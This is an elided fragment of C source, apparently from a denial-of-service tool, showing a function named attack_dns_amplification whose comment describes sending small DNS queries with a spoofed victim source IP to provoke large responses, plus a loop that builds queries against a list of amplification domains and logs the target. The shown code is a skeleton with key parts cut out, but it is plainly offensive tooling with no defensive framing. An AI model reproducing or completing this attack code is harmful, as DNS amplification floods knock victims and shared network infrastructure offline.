 ...
 * Sends small DNS queries with spoofed source IP (victim) that generate large responses.
 */
...
void *attack_dns_amplification(void *arg) {
    ...
    log_warn("Target: %s:%d", 
             inet_ntoa(params->victim.sin_addr),
    ...
    while (1) {
        // Build DNS query
        int dns_len = build_dns_query(dns_query, 512, 
                                      amplification_domains[domain_idx]);
